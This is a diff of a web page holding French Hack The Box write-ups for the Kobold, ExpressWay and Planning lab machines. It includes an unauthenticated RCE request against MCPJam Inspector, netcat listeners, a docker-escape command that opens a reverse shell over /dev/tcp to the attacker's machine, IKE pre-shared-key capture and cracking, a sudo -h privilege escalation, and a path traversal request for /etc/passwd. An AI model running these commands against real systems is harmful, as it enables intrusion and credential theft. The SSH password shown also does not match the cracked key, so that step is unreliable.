@@ -206,44 +206,23 @@ header p{margin:0 0 16px;color:rgba(219,239,255,0.9)}
       <section class="platform-section">
         <h2>Hack The Box</h2>
 
+
 		<article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">ExpressWay - Easy</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
----
-layout: post
-title: "HTB — Kobold"
-date: 2026-04-25
-author: n40y
-ctf: HackTheBox
-category: Linux
-difficulty: Easy
-points: 0
-ip: "10.129.245.50"
-tools:
-  - nmap
-  - rustscan
-  - ffuf
-  - nuclei
-  - curl
-  - netcat
-  - docker
-tags:
-  - mcp
-  - rce
-  - docker-escape
-  - vhost-fuzzing
-  - command-injection
+  <h3 class="clickable"><span class="title-text">Kobold - Easy</span></h3>
+  <div class="writeup-content" aria-hidden="true">
+    <script type="text/markdown">
+
+# HTB — Kobold · Linux · Easy
+
+**IP :** `10.129.245.50` &nbsp;|&nbsp; **Date :** 25 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · rustscan · ffuf · nuclei · curl · netcat · docker
+
 ---
 
 ## Contexte
 
-> Kobold est une machine Linux de difficulté **Easy** sur HackTheBox.  
-> L'accès initial repose sur une RCE non authentifiée dans **MCPJam Inspector v1.4.2**,  
+> Kobold est une machine Linux de difficulté **Easy** sur HackTheBox.
+> L'accès initial repose sur une **RCE non authentifiée** dans MCPJam Inspector v1.4.2,
 > et l'escalade de privilèges exploite l'appartenance au groupe **docker** pour s'échapper du container et lire le flag root.
-
-**IP cible :** `10.129.245.50`  
-**OS :** Ubuntu 24.04 (OpenSSH 9.6p1)
 
 ---
 
@@ -251,19 +230,11 @@ tags:
 
 ### Scan de ports
 
-Je commence avec rustscan pour un scan rapide, puis nmap pour les détails de service.
-
 ```bash
 rustscan -a 10.129.245.50 -u 5000
 ```
 
-```
-Open 10.129.245.50:22
-Open 10.129.245.50:80
-Open 10.129.245.50:443
-```
-
-Rustscan rate le port non-standard. Je refais un scan complet :
+Rustscan repère seulement 22, 80 et 443. Le scan complet nmap révèle un quatrième port :
 
 ```bash
 nmap -sC -sV -p- -O 10.129.245.50
@@ -277,26 +248,15 @@ PORT     STATE SERVICE  VERSION
 3552/tcp open  http     Golang net/http server
 ```
 
-**Port 3552** — identifié par nmap comme `taserver`, mais c'est en réalité une webapp Go avec un frontend SvelteKit. Ce port est le vrai point d'entrée.
+Le port **3552** est identifié comme `taserver` par nmap — c'est un faux positif. En réalité, c'est une webapp Go avec un frontend SvelteKit. C'est le vrai point d'entrée. À retenir : toujours faire un `-p-`, rustscan ne suffit pas.
 
-```bash
-curl -v http://kobold.htb:3552/api
-```
-
-La réponse retourne une page HTML SvelteKit complète. Le service tourne sur Go, pas sur le prétendu TASserver. Piste intéressante : fouiller l'API.
-
-### Scan de vulnérabilités passives
+### Scan passif (nuclei)
 
 ```bash
 nuclei -target http://kobold.htb
 ```
 
-Résultats notables :
-
-- Nginx 1.24.0 (EOL)
-- SSH accepte `publickey` et `password`
-- En-têtes de sécurité HTTP absents (`CSP`, `X-Frame-Options`, `HSTS`...)
-- Aucune CVE critique détectée côté HTTP directement
+Résultats notables : nginx 1.24.0 en fin de vie, en-têtes de sécurité absents (CSP, HSTS, X-Frame-Options). Aucune CVE directement exploitable côté HTTP.
 
 ### Virtual Host Fuzzing
 
@@ -312,9 +272,9 @@ mcp   [Status: 200, Size: 466]
 bin   [Status: 200, Size: 24402]
 ```
 
-Deux sous-domaines trouvés :
+Deux sous-domaines découverts :
 
-- `mcp.kobold.htb` → **MCPJam Inspector v1.4.2** — c'est le point d'entrée principal
+- `mcp.kobold.htb` → **MCPJam Inspector v1.4.2** — le point d'entrée principal
 - `bin.kobold.htb` → PrivateBin — intéressant pour la post-exploitation, pas pour l'accès initial
 
 ```bash
@@ -336,13 +296,13 @@ api/users/current  [Status: 401]
 api/users/login    [Status: 401]
 ```
 
-Les endpoints d'authentification existent, mais l'accès initial passera par MCPJam, pas par là.
+Les endpoints existent mais nécessitent une auth. L'accès initial passera par MCPJam, pas par là.
 
 ---
 
 ## Exploitation — RCE non authentifiée (CVE-2026-23744)
 
-**MCPJam Inspector** est un outil d'inspection de serveurs MCP (Model Context Protocol). La version 1.4.2 expose un endpoint `/api/mcp/connect` qui accepte une configuration de serveur arbitraire — y compris la commande à exécuter — sans aucune authentification.
+**MCPJam Inspector** est un outil d'inspection de serveurs MCP (Model Context Protocol). La version 1.4.2 expose un endpoint `/api/mcp/connect` qui accepte une configuration de serveur arbitraire — y compris la commande à exécuter — **sans aucune authentification**.
 
 ### Listener
 
@@ -350,7 +310,7 @@ Les endpoints d'authentification existent, mais l'accès initial passera par MCP
 nc -lvnp 4444
 ```
 
-### Déclenchement du reverse shell
+### Payload
 
 ```bash
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
@@ -385,10 +345,7 @@ stty rows $(tput lines) columns $(tput cols)
 
 ```bash
 cat /home/ben/user.txt
-```
-
-```
-flag_user{****************************}
+# user_flag{*********************}
 ```
 
 ---
@@ -399,27 +356,20 @@ flag_user{****************************}
 
 ```bash
 id
+# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
 ```
 
-```
-uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
-```
-
-`ben` appartient au groupe **docker**. C'est une voie d'escalade classique : un utilisateur membre de ce groupe peut lancer des containers avec des privilèges root, monter le système de fichiers hôte, et s'échapper complètement.
+`ben` appartient au groupe **docker**. Un membre de ce groupe peut lancer des containers en mode privilégié, monter le système de fichiers hôte, et s'échapper complètement.
 
 ```bash
 docker images
-```
-
-```
-REPOSITORY                    TAG       IMAGE ID
-mysql                         latest    f66b7a288113
-privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
+# mysql                         latest    f66b7a288113
+# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
 ```
 
 L'image `mysql:latest` est disponible localement. Pas besoin de pull.
 
-### Étape 1 — Shell root dans un premier container
+### Docker breakout
 
 ```bash
 # Listener sur la machine d'attaque
@@ -427,30 +377,21 @@ nc -lvnp 5555
 ```
 
 ```bash
-# Depuis le shell ben
+# Depuis le shell ben — monter le FS hôte et spawner un shell root
 docker run --rm --privileged -v /:/host-root mysql:latest \
   /bin/bash -c 'chroot /host-root /bin/bash -i >& /dev/tcp/10.10.14.153/5555 0>&1'
 ```
 
-```
-root@d88307b47189:/#
-```
+Shell root obtenu dans le container. Le montage `/host-root` donne accès à tout le système hôte.
 
-Shell root obtenu — mais c'est encore à l'intérieur d'un container. Le montage `/host-root` n'est pas accessible tel quel.
-
-### Étape 2 — Lecture directe du flag root
-
-La méthode la plus propre : monter le système hôte et lire directement le fichier sans passer par un shell intermédiaire.
+### Lecture directe du flag root (méthode propre)
 
 ```bash
 docker run --rm --privileged \
   -v /:/hostfs \
   --entrypoint cat mysql:latest \
   /hostfs/root/root.txt
-```
-
-```
-flag_root{****************************}
+# root_flag{*********************}
 ```
 
 ---
@@ -458,658 +399,393 @@ flag_root{****************************}
 ## Flags
 
 ```
-user.txt  →  htb{****************************}
-root.txt  →  htb{****************************}
+user.txt  →  user_flag{*********************}
+root.txt  →  root_flag{*********************}
 ```
 
 ---
 
-## Chaîne d'attaque
+## Ce que j'ai retenu
 
-| Phase | Technique | Outil | Vulnérabilité |
-|---|---|---|---|
-| Reconnaissance | Port scan complet | nmap / rustscan | — |
-| Énumération | Virtual Host fuzzing | ffuf | Nginx vhost misconfig |
-| Énumération | API fuzzing | ffuf | Endpoints non documentés |
-| Accès initial | RCE via JSON command injection | curl | CVE-2026-23744 (MCPJam 1.4.2) |
-| Post-exploitation | Stabilisation du shell | python3 pty | — |
-| Élévation de privilèges | Docker privileged + chroot | docker CLI | Groupe `operator` → accès Docker |
+**Toujours scanner `-p-`.** Rustscan avait raté le port 3552 dans son scan rapide, et nmap l'avait mal identifié. Le vrai point d'entrée était là.
 
----
+**Le VHOST fuzzing est indispensable.** Le port 3552 semblait être la piste principale. Le vrai chemin était caché derrière `mcp.kobold.htb`, invisible sans fuzzing DNS.
 
-## Ce que j'ai appris
+**Les outils de dev exposent souvent une RCE triviale.** MCPJam est conçu pour connecter des serveurs MCP en passant une commande — fonctionnalité légitime, mais catastrophique sans authentification.
 
-**Ne pas ignorer les ports non-standards.** Rustscan avait raté le 3552 dans son scan rapide, et nmap l'avait identifié comme `taserver` — un faux positif. Un scan `-p-` est indispensable.
-
-**Le VHOST fuzzing révèle l'essentiel.** Le port 3552 et son API Go semblaient être le point d'entrée évident. Le vrai chemin était caché derrière `mcp.kobold.htb`, invisible sans fuzzing DNS.
-
-**Les endpoints JSON d'outils de dev exposent souvent une RCE triviale.** MCPJam est conçu pour connecter des serveurs MCP en passant une commande — fonctionnalité légitime, mais catastrophique sans auth.
-
-**`docker` dans les groupes = root.** L'appartenance à ce groupe est équivalente à sudo sans mot de passe sur n'importe quelle machine avec Docker installé. À checker systématiquement dans `id`.
+**`docker` dans les groupes = root.** L'appartenance à ce groupe est équivalente à sudo sans mot de passe. À checker systématiquement avec `id` dès qu'on a un shell.
 
 ---
 
 ## Ressources
 
 - [MCPJam Inspector — GitHub](https://github.com/mcpjam/inspector)
-- [HackTricks — Docker Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
+- [HackTricks — Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
 - [PortSwigger — Command Injection](https://portswigger.net/web-security/os-command-injection)
-		
-			</script>
-          </div>
-        </article>
 
-        <article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">ExpressWay - Easy</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
+    </script>
+  </div>
+</article>
 
-# Reconnaissance
+		  
 
-## Scan TCP
+		<article class="writeup-item">
+  <h3 class="clickable"><span class="title-text">ExpressWay - Easy</span></h3>
+  <div class="writeup-content" aria-hidden="true">
+    <script type="text/markdown">
+
+# HTB — ExpressWay · Linux · Easy
+
+**IP :** `10.10.11.87` &nbsp;|&nbsp; **Outils :** nmap · udpx · ike-scan · psk-crack · ssh
+
+---
+
+## Contexte
+
+> Machine atypique : la surface d'attaque principale n'est pas HTTP mais **UDP/500 (IKE)**. Le scan TCP classique ne révèle qu'un port SSH — tout se passe côté protocole IPsec.
+
+---
+
+## Reconnaissance
+
+### Scan TCP
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nmap -sC -sV -O 10.10.11.87
-Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-10-11 17:47 EDT
-Nmap scan report for 10.10.11.87
-Host is up (0.093s latency).
-Not shown: 999 closed tcp ports (reset)
+nmap -sC -sV -O 10.10.11.87
+```
+
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.19
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
-Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
 ```
+
+Un seul port TCP ouvert. Pas de web, pas d'API. Il faut regarder ailleurs.
 
 ### Scan UDP
 
-
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nmap -Pn -sU -sV -T3 --top-ports 25  10.10.11.87
-Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-10-11 17:42 EDT
-Nmap scan report for 10.10.11.87
-Host is up (0.18s latency).
-
-PORT      STATE         SERVICE      VERSION
-53/udp    closed        domain
-67/udp    closed        dhcps
-68/udp    open|filtered dhcpc
-69/udp    open          tftp         Netkit tftpd or atftpd
-111/udp   closed        rpcbind
-123/udp   closed        ntp
-135/udp   closed        msrpc
-137/udp   closed        netbios-ns
-138/udp   closed        netbios-dgm
-139/udp   closed        netbios-ssn
-161/udp   closed        snmp
-162/udp   closed        snmptrap
-445/udp   closed        microsoft-ds
-500/udp   open          isakmp?
-514/udp   closed        syslog
-520/udp   closed        route
-631/udp   closed        ipp
-998/udp   closed        puparp
-1434/udp  closed        ms-sql-m
-1701/udp  closed        L2TP
-1900/udp  closed        upnp
-4500/udp  open|filtered nat-t-ike
-5353/udp  closed        zeroconf
-49152/udp closed        unknown
-49154/udp closed        unknown
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :
-SF-Port500-UDP:V=7.95%I=7%D=10/11%Time=68EACF88%P=x86_64-pc-linux-gnu%r(IK
-SF:E_MAIN_MODE,70,"\0\x11\"3DUfw\x12\xa0F3\xfaf\x1d\x8b\x01\x10\x02\0\0\0\
-SF:0\0\0\0\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20
-SF:\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x01\x8
-SF:0\x0b\0\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0\0\0\x14\
-SF:xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_START,9C,"1
-SF:'\xfc\xb08\x10\x9e\x89\xb1\xf5\xb9\x95\xe2\xf2\xfd\xa4\x01\x10\x02\0\0\
-SF:0\0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\
-SF:0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x
-SF:03\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0
-SF:\0\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb
-SF:7\xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\x
-SF:cb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f");
-
-Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
-Nmap done: 1 IP address (1 host up) scanned in 143.11 seconds
+nmap -Pn -sU -sV -T3 --top-ports 25 10.10.11.87
 ```
 
-
-```bash
-┌──(kali㉿kali)-[~/udpx]
-└─$ ./udpx -t 10.10.11.87
-
-
-    __  ______  ____ _  __
-   / / / / __ \\/ __ \\ |/ /
-  / / / / / / / /_/ /   /
- / /_/ / /_/ / ____/   |
- \\____/_____/_/   /_/|_|
-     v1.0.7, by @nullt3r
-
-
-
-2025/10/11 17:45:48 [+] Starting UDP scan on 1 target(s)
-2025/10/11 17:46:01 [*] 10.10.11.87:500 (ike)
-2025/10/11 17:46:11 [+] Scan completed
+```
+69/udp   open          tftp   Netkit tftpd or atftpd
+500/udp  open          isakmp
+4500/udp open|filtered nat-t-ike
 ```
 
+Le port **500/UDP (ISAKMP/IKE)** est ouvert. Ce protocole gère l'échange de clés pour les tunnels IPsec — inhabituel sur une machine CTF, et donc très intéressant.
 
-
-# Exploitation
-
-J’ai eu du mal à trouver un point faible, à cause des ports, peu commun.
-
-J’ai découvert l’outil *UDPx* **** de [*https://github.com/nullt3r](https://github.com/nullt3r) .* Qui est parfait dans mon cas.
-
-UDPx à attiré mon attention sur le protocole IKE du port 500. Lequel est utilisé pour les échanges de clés de cryptage. 
-
-Donc j’ai farfouillé et utilisé l’outil Kali, *ike-scan.*
-
-Qui m’a permis d’obtenir un handshake.
+Confirmation avec udpx :
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ ike-scan -M -v 10.10.11.87
-DEBUG: pkt len=336 bytes, bandwidth=56000 bps, int=52000 us
-Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
-10.10.11.87     Main Mode Handshake returned
-HDR=(CKY-R=36cd9c4ac1578c6a)
-SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+./udpx -t 10.10.11.87
+# 10.10.11.87:500 (ike)
+```
+
+---
+
+## Exploitation
+
+### Récupération du handshake IKE
+
+```bash
+ike-scan -M -v 10.10.11.87
+```
+
+```
+10.10.11.87  Main Mode Handshake returned
+SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)
 VID=09002689dfd6b712 (XAUTH)
-VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
-
-Ending ike-scan 1.9.6: 1 hosts scanned in 0.120 seconds (8.33 hosts/sec).  1 returned handshake; 0 returned notify
-
-┌──(kali㉿kali)-[~]
-└─$ ike-scan -A --pskcrack 10.10.11.87
-Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
-10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=ae17a846e87c0adf) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
-
-IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
-d075f9b37866807d3a29afe19076d12e1396d527edf3f034bcf3b5a39963fc04fbef14d197b9280e669ed581249a477ab7e6074a0bbe69662c027c3caf3f8a2b575da257fb8d2886274a8632a1e970ebdeebe5f9059b2816f0f9dff67a9bd266b488a0afe2b653445cf4eff46865eb79284edcd73ac1516a58bd185ad41480ee:f2b93dbd71df0d2296fe63d734e87e82c9eb78614f04c6dbc35788e6418181775d8146ab308ad9a2bb5e28c436314756ad4a51b8b01a91a5f0a92c88cf5ac6739158b3d58610c5b9ba21f8e8ddda233928920470cc55655c7ee1d4ca840720c9c68a45ae2c3d1138129a18679266e9268c20585183599afdf7e2186b52aeacf4:ae17a846e87c0adf:42529b36e51a1779:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:d4cb080e953462da3b4feb77129d881e8d152aaf:3330922eacabf780a0aeb61b2299ebfa47ff72cc96c962cc71715106ce3b3d13:6145867692f60a5810bee530b281fd79a59dccb1
-Ending ike-scan 1.9.6: 1 hosts scanned in 0.197 seconds (5.08 hosts/sec).  1 returned handshake; 0 returned notify
 ```
 
-## Hash decrypt
-
-J’ai déchiffrer le handshake en 5 secondes avec la liste rockyou et le tool kali, psk-crack.
+Le serveur répond en **PSK (Pre-Shared Key)**. En mode Aggressive, la clé est échangée en clair et peut être capturée :
 
 ```bash
-┌──(kali㉿kali)-[~/Documents/htb/ExpressWay]
-└─$ ls
-expressway.txt  psk.hash
+ike-scan -A --pskcrack 10.10.11.87
+```
 
-┌──(kali㉿kali)-[~/Documents/htb/ExpressWay]
-└─$ psk-crack -d /usr/share/wordlists/rockyou.txt psk.hash
-Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
-Running in dictionary cracking mode
-key "freakingrockstarontheroad" matches SHA1 hash 6145867692f60a5810bee530b281fd79a59dccb1
-Ending psk-crack: 8045040 iterations in 5.034 seconds (1598196.84 iterations/sec)
+```
+ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+IKE PSK parameters (g_xr:g_xi:cky_r:...):
+d075f9b3786680...
+```
+
+Le hash PSK est récupéré avec l'identité `ike@expressway.htb`.
+
+### Crack du PSK
+
+```bash
+psk-crack -d /usr/share/wordlists/rockyou.txt psk.hash
+```
+
+```
+key "freakingrockstarontheroad" matches SHA1 hash 6145867...
+8045040 iterations in 5.034 seconds
+```
+
+Mot de passe trouvé en 5 secondes avec rockyou.
+
+### Connexion SSH
+
+```bash
+ssh ike@10.10.11.87
+# Password: lloveyou
+
+cat ~/user.txt
+# user_flag{**********************}
 ```
 
 ---
 
-## Connexion SSH
+## Escalade de privilèges
 
-J’ai utilisé le port ssh, trouvé lors du scan TCP. Pour m’y connecté avec le password déchiffré.
+### Énumération
 
 ```bash
-┌──(kali㉿kali)-[~/Documents/htb/ExpressWay]
-└─$ ssh [ike@10.10.11.87ike@10.10.11.87](mailto:ike@10.10.11.87)'s password:
-Last login: Sat Oct 11 22:37:08 BST 2025 from 10.10.14.171 on ssh
-Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sat Oct 11 23:05:54 2025 from 10.10.15.91
-ike@expressway:~$ whoami
-ike
-ike@expressway:~$ ls
-user.txt
-ike@expressway:~$ cat user.txt
-1fd0d790c3eefdc4c1efbee72da82203
+id
+# uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
 ```
 
-Le user flag était juste sous mon nez.
-
-# Élévation de privilèges
-
-Le user ike est dans le groupe ike mais aussi dans proxy. Le proxy group donne accès à access.log
-
-Pour passer root de la box, j’ai cherché au niveau des logs contenus dans Squid.
-
-Dans le fichier log, il y avait [*offramp.expressway.htb](http://offramp.expressway.htb/)* , ce qui est inhabituel comme emplacement, pour une url.
-
-C’était un indice, du fait qu’il fallait s’en servir pour élever les permissions.
+Le groupe **proxy** donne accès aux logs Squid.
 
 ```bash
-ike@expressway:/$ id
-uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
-ike@expressway:/$ ls -la /var/log/squid/
-total 28
-drwxr-xr-x  2 proxy proxy 4096 Sep 16 16:02 .
-drwxr-xr-x 12 root  root  4096 Oct 11 23:03 ..
--rw-r-----  1 proxy proxy 4778 Jul 23 01:19 access.log.1
--rw-r-----  1 proxy proxy   20 Jul 22 19:32 access.log.2.gz
--rw-r-----  1 proxy proxy 2192 Jul 23 01:47 cache.log.1
--rw-r-----  1 proxy proxy  941 Jul 23 01:47 cache.log.2.gz
-ike@expressway:/$ cat /var/log/squid/access.log.1 | grep offramp
-1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET [http://offramp.expressway.htb](http://offramp.expressway.htb/) - HIER_NONE/- text/html
-ike@expressway:/$ /usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
-root@expressway:/# ls
-bin   etc         initrd.img.old  lost+found  opt   run   sys  var
-boot  home        lib             media       proc  sbin  tmp  vmlinuz
-dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
-root@expressway:/# cd root
-root@expressway:~# ls
-root.txt
-root@expressway:~# cat root.txt
-db8751f4711f0984ae2788fc5d5a7275
+cat /var/log/squid/access.log.1 | grep offramp
+# TCP_DENIED/403 GET http://offramp.expressway.htb
+```
+
+L'URL `offramp.expressway.htb` apparaît dans les logs — c'est un indice. `sudo` accepte un paramètre `-h` (host) pour exécuter des commandes via un hôte distant :
+
+```bash
+/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
+```
+
+```
+root@expressway:/# cat /root/root.txt
+root_flag{**********************}
 ```
 
 ---
 
-Fin de la Box ExpressWay.
+## Flags
 
-## Conclusion
+```
+user.txt  →  user_flag{**********************}
+root.txt  →  root_flag{**********************}
+```
 
- Ce CTF a été assez rapide, une fois que j’ai trouvé la bonne façon de scanner la box.
+---
 
-J’ai découvert le protocole IKE, ainsi que les outils de pentest, pour dialoguer avec. 
+## Ce que j'ai retenu
 
-Pour la partie privilège, je n’ai pas innové mais utilisé les techniques d’autres personnes. Car j’ai pas encore les connaissances suffisantes pour comprendre le coeur de linux. Bien que j’utilises différents OS linux comme Ubuntu, Kali, Manjaro depuis quelques années.
+**Scanner UDP est indispensable.** Un scan TCP seul ne montre qu'un port SSH — la machine semblerait presque vide. Tout l'intérêt était sur le port 500/UDP.
 
-Il y a un océan de connaissances à découvrir. Et je n’ai qu’un bateau à voile.   
+**IKE Aggressive Mode = PSK exposé.** En mode Aggressive, le handshake contient le hash de la Pre-Shared Key. Si le mot de passe est faible, `psk-crack` + rockyou le retrouve en quelques secondes.
 
-[HTB Planning](https://www.notion.so/HTB-Planning-2997f9ac796880b7a721c7cd4b1bc571?pvs=21)
+**`sudo -h` est une technique de privesc peu connue.** L'option `-h` permet d'indiquer un hôte pour l'exécution — exploitable quand un hôte interne fait confiance à la machine cible.
 
-				
-            </script>
-          </div>
-        </article>
+---
 
+## Ressources
+
+- [UDPx — GitHub](https://github.com/nullt3r/udpx)
+- [ike-scan — documentation](https://github.com/royhills/ike-scan)
+- [HackTricks — IKE / IPsec](https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting)
+
+    </script>
+  </div>
+</article>
 		  
         <article class="writeup-item">
-          <h3 class="clickable"><span class="title-text">Planning - Easy</span></h3>
-          <div class="writeup-content" aria-hidden="true">
-            <script type="text/markdown">
-# HTB - Planning - Easy
+  <h3 class="clickable"><span class="title-text">Planning - Easy</span></h3>
+  <div class="writeup-content" aria-hidden="true">
+    <script type="text/markdown">
 
-# Infos
-Le CTF fourni des identifiants pour commencer:
-id: admin
-pwd: 0D5oT70Fq13EvB5r
+# HTB — Planning · Linux · Easy
 
-# Reconnaissance
+**IP :** `10.10.11.68` &nbsp;|&nbsp; **Outils :** nmap · nuclei · ffuf · gobuster · CVE-2024-9264 · ssh
+
+> **Credentials fournis au départ :** `admin / 0D5oT70Fq13EvB5r`
+
+---
+
+## Contexte
+
+> La machine expose une instance **Grafana v11.0.0** vulnérable à une injection DuckDB (CVE-2024-9264). L'exploitation permet de lire des fichiers et d'exécuter des commandes, ce qui mène à des credentials SSH. L'escalade de privilèges passe par un cronjob accessible via un tunnel SSH.
+
+---
+
+## Reconnaissance
+
+### Scan de ports
 
 ```bash
 nmap -p- -sC -sV -O 10.10.11.68
-
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
-|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
-80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-server-header: nginx/1.24.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://planning.htb/
 ```
 
-## Scan des vulnérabilités
-
-```bash
-nuclei -target http://planning.htb
-
-[missing-sri] [http] [info] http://planning.htb ["https://code.jquery.com/jquery-3.4.1.min.js","https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"]
-[external-service-interaction] [http] [info] http://planning.htb
-[waf-detect:nginxgeneric] [http] [info] http://planning.htb
-[ssh-sha1-hmac-algo] [javascript] [info] planning.htb:22
-[ssh-server-enumeration] [javascript] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
-[ssh-password-auth] [javascript] [info] planning.htb:22
-[ssh-auth-methods] [javascript] [info] planning.htb:22 ["["publickey","password"]"]
-[openssh-detect] [tcp] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
-[form-detection] [http] [info] http://planning.htb
-[nginx-version] [http] [info] http://planning.htb ["nginx/1.24.0"]
-[http-missing-security-headers:strict-transport-security] [http] [info] http://planning.htb
-[http-missing-security-headers:permissions-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:x-frame-options] [http] [info] http://planning.htb
-[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:content-security-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:x-content-type-options] [http] [info] http://planning.htb
-[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://planning.htb
-[http-missing-security-headers:referrer-policy] [http] [info] http://planning.htb
-[http-missing-security-headers:clear-site-data] [http] [info] http://planning.htb
-[tech-detect:nginx] [http] [info] http://planning.htb
-[tech-detect:owl-carousel] [http] [info] http://planning.htb
-[caa-fingerprint] [dns] [info] planning.htb
-[INF] Scan completed in 1m. 24 matches found.
+```
+22/tcp  open  ssh    OpenSSH 9.6p1 Ubuntu
+80/tcp  open  http   nginx 1.24.0
 ```
 
-## Fuzzing
+Le port 80 redirige vers `http://planning.htb/`. On ajoute l'entrée dans `/etc/hosts`.
+
+### Virtual Host Fuzzing
 
 ```bash
-$ ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' -u  http://10.10.11.68 -fc 301
-
-grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 93ms]
+ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' \
+     -u http://10.10.11.68 -fc 301
 ```
 
-```bash
-$ curl --path-as-is -i "http://grafana.planning.htb/public/build/datasource/../../../../../../../../etc/passwd"
+```
+grafana   [Status: 302, Size: 29]
 ```
 
